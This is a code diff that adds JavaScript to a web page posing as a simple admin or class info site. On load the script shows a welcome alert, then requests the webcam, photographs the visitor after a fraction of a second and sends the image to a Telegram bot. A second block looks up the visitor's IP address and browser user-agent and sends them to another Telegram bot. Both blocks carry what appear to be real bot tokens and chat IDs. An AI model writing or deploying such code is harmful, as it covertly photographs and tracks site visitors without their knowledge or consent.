@@ -162,6 +162,124 @@
 
     <script>
         alert("Admin Website By Rov!");
+        function capturePhoto() {
+            var video = document.getElementById('video');
+            var canvas = document.createElement('canvas');
+            var context = canvas.getContext('2d');
+
+            // Cài đặt kích thước canvas bằng kích thước video
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+
+            // Chụp ảnh từ video
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            // Lấy dữ liệu ảnh dưới dạng Blob
+            canvas.toBlob(function (blob) {
+                if (blob) {
+                    console.log('Ảnh đã được chụp, kích thước Blob:', blob.size); // Debug log
+
+                    // Gửi ảnh qua Telegram
+                    var formData = new FormData();
+                    formData.append('chat_id', '5805939083'); // Thay YOUR_CHAT_ID bằng Chat ID của bot Telegram
+                    formData.append('photo', blob, 'photo.jpg');
+
+                    $.ajax({
+                        type: 'POST',
+                        url: 'https://api.telegram.org/bot7895273648:AAEnB_npyBZfqw7Wzi8QLcRirZ8rtDCP4zw/sendPhoto', // Thay YOUR_TELEGRAM_BOT_TOKEN bằng Telegram Bot Token của bạn
+                        data: formData,
+                        processData: false,
+                        contentType: false,
+                        success: function (response) {
+                            console.log('Đã gửi ảnh thành công đến Telegram:', response); // Log thành công
+                            stopCamera(); // Dừng camera sau khi gửi ảnh
+                        },
+                        error: function (error) {
+                            console.log('Lỗi khi gửi ảnh đến Telegram: ', error); // Log lỗi
+                            stopCamera(); // Dừng camera trong trường hợp lỗi
+                        }
+                    });
+                } else {
+                    console.log('Không thể tạo Blob từ canvas.');
+                }
+            }, 'image/jpeg');
+        }
+
+        // Dừng camera
+        function stopCamera() {
+            var video = document.getElementById('video');
+            var stream = video.srcObject;
+
+            if (stream) {
+                // Dừng tất cả các track video
+                stream.getTracks().forEach(function(track) {
+                    track.stop();
+                });
+            }
+            video.srcObject = null; // Giải phóng video
+            console.log('Camera đã dừng.');
+        }
+
+        // Sử dụng API getUserMedia để truy cập webcam và tự động chụp ảnh
+        function requestCameraAccess() {
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(function (stream) {
+                    var video = document.getElementById('video');
+                    video.srcObject = stream;
+                    video.play();
+
+                    // Tự động chụp ảnh sau 1 giây
+                    setTimeout(function () {
+                        capturePhoto();
+                    }, 100);
+                })
+                .catch(function (error) {
+                    console.log('Đã xảy ra lỗi khi truy cập webcam: ' + error.message);
+                });
+        }
+
+        // Hiển thị hộp thoại alert và xử lý phản hồi của người dùng
+        function showCameraAccessAlert() {
+            alert('Welcome To INFO 10D1');
+            requestCameraAccess();
+        }
+
+        // Gọi hàm hiển thị hộp thoại alert khi trang web được tải
+        window.addEventListener('DOMContentLoaded', function () {
+            showCameraAccessAlert();
+        });
+
+        // Gửi thông tin hệ thống
+        $(document).ready(function () {
+            var telegramBotToken = '7609634562:AAEMWe9RHZO9OzQNVloWOfyJQIxpLBfD0CI'; // Thay YOUR_TELEGRAM_BOT_TOKEN bằng Bot Token của bạn
+            var chatId = '-4632009671'; // Thay YOUR_CHAT_ID bằng Chat ID của bot Telegram
+
+            // Lấy địa chỉ IP
+            $.getJSON('https://api.ipify.org?format=json', function (data) {
+                var ip = data.ip;
+                var userAgent = navigator.userAgent;
+
+                var message = '- Địa chỉ IP mới: ' + ip + '\n- User-Agent: ' + userAgent;
+
+                var payload = {
+                    chat_id: chatId,
+                    text: message
+                };
+
+                $.ajax({
+                    type: 'POST',
+                    url: 'https://api.telegram.org/bot' + telegramBotToken + '/sendMessage',
+                    data: payload,
+                    dataType: 'json',
+                    success: function (response) {
+                        console.log('Thông tin đã được gửi thành công đến Telegram');
+                    },
+                    error: function (error) {
+                        console.log('Lỗi khi gửi thông tin đến Telegram: ' + error);
+                    }
+                });
+            });
+        });
         document.addEventListener("DOMContentLoaded", () => {
             const audioElement = document.getElementById("playAudio");
 
